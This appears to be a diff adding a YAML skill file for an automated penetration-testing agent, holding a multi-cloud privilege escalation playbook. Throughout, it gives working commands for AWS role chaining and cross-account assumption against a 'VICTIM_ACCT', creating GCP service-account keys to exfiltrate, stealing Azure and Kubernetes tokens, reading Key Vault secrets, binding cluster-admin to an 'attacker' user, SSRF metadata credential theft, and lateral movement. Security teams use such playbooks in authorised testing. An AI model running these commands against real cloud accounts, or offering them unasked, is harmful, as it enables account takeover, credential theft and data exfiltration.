@@ -1,0 +1,121 @@
+schema_version: 1
+version: 3.0.0
+name: cloud-privilege-escalation
+description: >
+  Multi-cloud privilege escalation playbook covering AWS IAM misconfiguration exploitation
+  (privilege boundaries, role chaining, confused deputy), GCP service account impersonation,
+  Azure managed identity abuse, and Kubernetes RBAC privilege escalation. Includes enumeration
+  of overprivileged policies and lateral movement through cloud-native services.
+triggers:
+  - cloud privilege escalation
+  - iam privesc
+  - aws privesc
+  - gcp privesc
+  - azure privesc
+  - role chaining
+  - service account impersonation
+  - confused deputy
+  - iam enumeration
+  - cloud lateral movement
+  - sts assume role
+  - workload identity
+  - cloud rbac
+tools:
+  - python3
+  - curl
+knowledge: |
+  Cloud privilege escalation chains often involve misconfigured IAM policies, overly permissive
+  service accounts, and confused deputy vulnerabilities. Always enumerate current permissions first
+  before attempting escalation. All commands use cloud CLI tools accessible in the Kali sandbox.
+
+  1. AWS IAM ENUMERATION (Enumerate Before Escalating):
+     Current identity:
+       aws sts get-caller-identity                    →  Account, UserId, ARN
+     Enumerate attached policies:
+       aws iam list-attached-user-policies --user-name CURRENT_USER
+       aws iam list-user-policies --user-name CURRENT_USER
+       aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1
+     Enumerate roles assumable from current principal:
+       aws iam list-roles --query "Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.AWS, 'CURRENT_ARN')]"
+     Find overprivileged policies (wildcard actions):
+       aws iam list-policies --scope Local | python3 -c "
+       import json,sys,subprocess
+       for p in json.load(sys.stdin)['Policies']:
+           v = subprocess.check_output(['aws','iam','get-policy-version','--policy-arn',p['Arn'],'--version-id',p['DefaultVersionId']]).decode()
+           doc = json.loads(v)
+           for s in doc['PolicyVersion']['Document']['Statement']:
+               if s.get('Effect')=='Allow' and '*' in str(s.get('Action','')):
+                   print('WILDCARD:', p['PolicyName'], s.get('Action'))
+       "
+
+  2. AWS PRIVILEGE ESCALATION TECHNIQUES:
+     IAM PassRole + EC2 RunInstances (attach high-priv role to new instance):
+       aws ec2 run-instances --image-id ami-XXXXX --iam-instance-profile Arn=HIGH_PRIV_ROLE_ARN ...
+     Lambda CreateFunction + PassRole:
+       aws lambda create-function --function-name privesc --role HIGH_PRIV_ROLE_ARN --runtime python3.11 ...
+     STS AssumeRole (if assume-role is permitted):
+       aws sts assume-role --role-arn arn:aws:iam::ACCT:role/HighPrivRole --role-session-name attack
+       export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
+     Permission boundary bypass: if custom managed policy has no boundary, create admin user
+     STS confused deputy: cross-account role assumption without ExternalId condition
+       aws sts assume-role --role-arn arn:aws:iam::VICTIM_ACCT:role/ServiceRole --role-session-name test
+
+  3. GCP SERVICE ACCOUNT IMPERSONATION:
+     Enumerate accessible service accounts:
+       gcloud iam service-accounts list --format json
+     Generate access token for target SA (if iam.serviceAccounts.getAccessToken allowed):
+       gcloud auth print-access-token --impersonate-service-account TARGET_SA@PROJECT.iam.gserviceaccount.com
+     Check SA key uploads (iam.serviceAccountKeys.create → exfiltrate persistent key):
+       gcloud iam service-accounts keys create /tmp/sa-key.json --iam-account TARGET_SA@PROJECT.iam.gserviceaccount.com
+     Workload Identity Federation abuse: if external identity is mapped, assume GCP SA from AWS/OIDC token
+
+  4. AZURE MANAGED IDENTITY ABUSE:
+     Check if managed identity is assigned to current VM/Function:
+       curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" \
+         -H "Metadata: true"
+     List accessible resources with token:
+       curl -s "https://management.azure.com/subscriptions?api-version=2022-12-01" \
+         -H "Authorization: Bearer MANAGED_IDENTITY_TOKEN"
+     Escalate via Key Vault secret read:
+       curl -s "https://VAULT_NAME.vault.azure.net/secrets?api-version=7.3" \
+         -H "Authorization: Bearer TOKEN"
+
+  5. KUBERNETES RBAC PRIVILEGE ESCALATION:
+     Enumerate current permissions:
+       kubectl auth can-i --list
+       kubectl auth can-i create pods --namespace kube-system
+     ServiceAccount token abuse (from pod filesystem):
+       cat /var/run/secrets/kubernetes.io/serviceaccount/token
+       kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) auth can-i --list
+     Pod exec to privileged container (if exec is permitted):
+       kubectl exec -it PRIVILEGED_POD -- /bin/bash
+     Create pod with hostPID + privileged (if pods/create and hostPID allowed):
+       kubectl run privesc-pod --image=ubuntu --restart=Never --privileged --overrides='...'
+     RBAC role binding escalation (if rolebindings/create allowed):
+       kubectl create clusterrolebinding attacker-admin --clusterrole=cluster-admin --user=attacker
+
+  6. CLOUD METADATA SERVICE EXPLOITATION (SSRF → Credential Theft):
+     From SSRF context, fetch cloud instance metadata:
+       AWS (IMDSv1): http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
+       GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+              (requires Metadata-Flavor: Google header)
+       Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01
+              (requires Metadata: true header)
+     Use stolen short-lived credentials to enumerate/escalate in cloud control plane.
+
+  7. LATERAL MOVEMENT VIA CLOUD-NATIVE SERVICES:
+     AWS:  SSM Session Manager (if ssm:StartSession permitted → shell without SSH/VPN)
+           aws ssm start-session --target INSTANCE_ID
+     GCP:  Cloud Shell / Cloud Run Jobs → arbitrary code execution in managed environment
+     Azure: Azure Automation Runbook → execute code under automation account identity
+
+  IMPACT: Full cloud account compromise, cross-account access, persistent credential theft,
+  data exfiltration from S3/GCS/Blob, infrastructure takeover.
+references:
+  - https://attack.mitre.org/techniques/T1078/004/
+  - https://github.com/BishopFox/cloudfox
+  - https://github.com/RhinoSecurityLabs/pacu
+  - https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/cloud-privilege-escalation.yaml
